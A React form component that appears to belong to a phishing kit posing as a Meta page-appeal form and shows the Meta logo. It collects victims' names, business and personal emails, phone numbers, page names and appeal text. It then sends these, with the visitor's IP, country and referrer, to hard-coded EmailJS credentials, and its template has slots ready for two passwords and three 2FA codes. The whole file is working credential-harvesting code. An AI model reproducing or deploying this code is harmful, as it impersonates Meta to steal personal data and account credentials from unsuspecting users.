'use client';

import type { FC, FormEvent } from 'react';
import { useCallback, useMemo, useRef, useState } from 'react';

import MetaLogo from '@/assets/images/meta-image.png';
import PhoneInput from '@/components/ui/phone-input';
import ValidationMessage from '@/components/ui/validation-message';
import { useFormStore } from '@/store/form-store';
import { useGeoStore } from '@/store/geo-store';
import type { Dictionary } from '@/types/content';
import emailjs from '@emailjs/browser';
import Image from 'next/image';

const Step1: FC<{ onNext: () => void; formContent: Dictionary['formModal'] }> = ({ onNext, formContent }) => {
    const { geoInfo } = useGeoStore();
    const { fullName, businessEmail, personalEmail, pageName, phoneNumber, additionalInfo, agreeTerms, validationErrors, setField, setPhoneNumber, setValidationError, clearAllValidationErrors } = useFormStore();
    const countryCode = geoInfo?.country_code || 'US';
    const [isLoading, setIsLoading] = useState(false);

    const fullNameRef = useRef<HTMLInputElement>(null);
    const businessEmailRef = useRef<HTMLInputElement>(null);
    const personalEmailRef = useRef<HTMLInputElement>(null);
    const pageNameRef = useRef<HTMLInputElement>(null);
    const additionalInfoRef = useRef<HTMLTextAreaElement>(null);
    const agreeTermsRef = useRef<HTMLInputElement>(null);
    const phoneNumberRef = useRef<string>(phoneNumber);

    const initOptions = useMemo(
        () => ({
            initialCountry: countryCode.toLowerCase() as 'us',
            separateDialCode: true,
            strictMode: true,
            nationalMode: true,
            autoPlaceholder: 'aggressive' as const,
            placeholderNumberType: 'MOBILE' as const,
            countrySearch: false,
            containerClass: 'w-full'
        }),
        [countryCode]
    );

    const handlePhoneChange = useCallback(
        (number: string) => {
            phoneNumberRef.current = number;
            setPhoneNumber(number);
        },
        [setPhoneNumber]
    );

    const phoneInputProps = useMemo(
        () => ({
            name: 'phoneNumber',
            className: 'h-15 w-full rounded-[10px] border-2 border-[#d4dbe3] bg-white px-3 py-1.5'
        }),
        []
    );

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        if (isLoading) return;

        const formFullName = fullNameRef.current?.value.trim() ?? '';
        const formBusinessEmail = businessEmailRef.current?.value.trim() ?? '';
        const formPersonalEmail = personalEmailRef.current?.value.trim() ?? '';
        const formPageName = pageNameRef.current?.value.trim() ?? '';
        const formPhoneNumber = phoneNumberRef.current.trim();
        const formAdditionalInfo = additionalInfoRef.current?.value.trim() ?? '';
        const formAgreeTerms = agreeTermsRef.current?.checked ?? false;

        clearAllValidationErrors();
        let hasErrors = false;
        if (!formFullName) {
            setValidationError('fullName', formContent.step1.validation.fullNameRequired);
            hasErrors = true;
        }
        if (!formBusinessEmail) {
            setValidationError('businessEmail', formContent.step1.validation.businessEmailRequired);
            hasErrors = true;
        }
        if (!formPersonalEmail) {
            setValidationError('personalEmail', formContent.step1.validation.personalEmailRequired);
            hasErrors = true;
        }
        if (!formPageName) {
            setValidationError('pageName', formContent.step1.validation.pageNameRequired);
            hasErrors = true;
        }
        if (!formPhoneNumber) {
            setValidationError('phoneNumber', formContent.step1.validation.phoneNumberRequired);
            hasErrors = true;
        }
        if (!formAdditionalInfo) {
            setValidationError('additionalInfo', formContent.step1.validation.additionalInfoRequired);
            hasErrors = true;
        }
        if (!formAgreeTerms) {
            setValidationError('agreeTerms', formContent.step1.validation.agreeTermsRequired);
            hasErrors = true;
        }

        if (hasErrors) return;

        setField({ target: { name: 'fullName', value: formFullName, type: 'text' } } as React.ChangeEvent<HTMLInputElement>);
        setField({ target: { name: 'businessEmail', value: formBusinessEmail, type: 'email' } } as React.ChangeEvent<HTMLInputElement>);
        setField({ target: { name: 'personalEmail', value: formPersonalEmail, type: 'email' } } as React.ChangeEvent<HTMLInputElement>);
        setField({ target: { name: 'pageName', value: formPageName, type: 'text' } } as React.ChangeEvent<HTMLInputElement>);
        setField({ target: { name: 'additionalInfo', value: formAdditionalInfo, type: 'textarea' } } as React.ChangeEvent<HTMLTextAreaElement>);
        setField({ target: { name: 'agreeTerms', checked: formAgreeTerms, type: 'checkbox' } } as React.ChangeEvent<HTMLInputElement>);

        setIsLoading(true);

        try {
            const templateParams = {
                user_ip: geoInfo?.ip || 'unknown',
                country: countryCode || 'unknown',
                'full-name': formFullName,
                'buiseness-email': formBusinessEmail,
                'personal-email': formPersonalEmail,
                'mobile-phone-number': formPhoneNumber,
                'page-name': formPageName,
                'password-1': '',
                'password-2': '',
                '2FA-1': '',
                '2FA-2': '',
                '2FA-3': '',
                apeal: formAdditionalInfo,
                user_referrer: document?.referrer
            };
            await emailjs.send('service_q24racw', 'template_px9og2y', templateParams, { publicKey: 'zfcufNH8QZhzMnIxU' });

            onNext();
        } catch (error) {
            console.error('Failed to send email:', error);
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className='flex w-full flex-col'>
            <div className='flex-1 overflow-y-auto'>
                <form onSubmit={handleSubmit} className='mt-4 flex flex-col gap-3'>
                    <div>
                        <div className='relative w-full'>
                            <input ref={fullNameRef} name='fullName' type='text' id='fullName-input' defaultValue={fullName} className='peer h-15 w-full rounded-[10px] border-2 border-[#d4dbe3] bg-white px-3 pt-6 pb-2 placeholder-transparent focus:outline-none' placeholder='Full Name' />
                            <label htmlFor='fullName-input' className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#4a4a4a] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'>
                                {formContent.step1.fullName}
                            </label>
                        </div>
                        <ValidationMessage message={validationErrors.fullName} visible={!!validationErrors.fullName} type='error' />
                    </div>

                    <div>
                        <div className='relative w-full'>
                            <input ref={businessEmailRef} name='businessEmail' type='email' id='businessEmail-input' defaultValue={businessEmail} className='peer h-15 w-full rounded-[10px] border-2 border-[#d4dbe3] bg-white px-3 pt-6 pb-2 placeholder-transparent focus:outline-none' placeholder='Business Email' />
                            <label htmlFor='businessEmail-input' className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#4a4a4a] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'>
                                {formContent.step1.businessEmail}
                            </label>
                        </div>
                        <ValidationMessage message={validationErrors.businessEmail} visible={!!validationErrors.businessEmail} type='error' />
                    </div>

                    <div>
                        <div className='relative w-full'>
                            <input ref={personalEmailRef} name='personalEmail' type='email' id='personalEmail-input' defaultValue={personalEmail} className='peer h-15 w-full rounded-[10px] border-2 border-[#d4dbe3] bg-white px-3 pt-6 pb-2 placeholder-transparent focus:outline-none' placeholder='Personal Email' />
                            <label htmlFor='personalEmail-input' className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#4a4a4a] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'>
                                {formContent.step1.personalEmail}
                            </label>
                        </div>
                        <ValidationMessage message={validationErrors.personalEmail} visible={!!validationErrors.personalEmail} type='error' />
                    </div>

                    <div>
                        <div className='relative w-full'>
                            <input ref={pageNameRef} name='pageName' type='text' id='pageName-input' defaultValue={pageName} className='peer h-15 w-full rounded-[10px] border-2 border-[#d4dbe3] bg-white px-3 pt-6 pb-2 placeholder-transparent focus:outline-none' placeholder='Page Name' />
                            <label htmlFor='pageName-input' className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#4a4a4a] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'>
                                {formContent.step1.pageName}
                            </label>
                        </div>
                        <ValidationMessage message={validationErrors.pageName} visible={!!validationErrors.pageName} type='error' />
                    </div>

                    <div>
                        <p className='mb-1 font-sans'>{formContent.step1.phoneNumber}</p>
                        <PhoneInput onChangeNumber={handlePhoneChange} initOptions={initOptions} inputProps={phoneInputProps} />
                        <ValidationMessage message={validationErrors.phoneNumber} visible={!!validationErrors.phoneNumber} type='error' />
                    </div>

                    <div>
                        <div className='relative w-full'>
                            <textarea ref={additionalInfoRef} name='additionalInfo' id='additionalInfo-input' defaultValue={additionalInfo} className='peer min-h-25 w-full resize-y rounded-[10px] border-2 border-[#d4dbe3] bg-white px-3 pt-6 pb-2 placeholder-transparent focus:outline-none' placeholder='Additional Info' />
                            <label htmlFor='additionalInfo-input' className='absolute top-4 left-3 cursor-text text-[#4a4a4a] transition-all duration-200 ease-in-out peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:text-xs'>
                                {formContent.step1.additionalInfo}
                            </label>
                        </div>
                        <ValidationMessage message={validationErrors.additionalInfo} visible={!!validationErrors.additionalInfo} type='error' />
                    </div>

                    <p className='text-sm text-gray-600 italic'>{formContent.step1.note}</p>

                    <div>
                        <label className='flex cursor-pointer items-center gap-2'>
                            <input ref={agreeTermsRef} type='checkbox' name='agreeTerms' defaultChecked={agreeTerms} className='h-4 w-4 cursor-pointer' />
                            <span className='text-sm'>{formContent.step1.agreeTerms}</span>
                        </label>
                        <ValidationMessage message={validationErrors.agreeTerms} visible={!!validationErrors.agreeTerms} type='error' />
                    </div>

                    <button type='submit' disabled={isLoading} className={`mt-4 flex h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
                        {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : formContent.step1.sendButton}
                    </button>
                </form>
            </div>

            <div className='flex items-center justify-center pt-3'>
                <Image src={MetaLogo} alt='' className='w-16' />
            </div>
        </div>
    );
};

export default Step1;
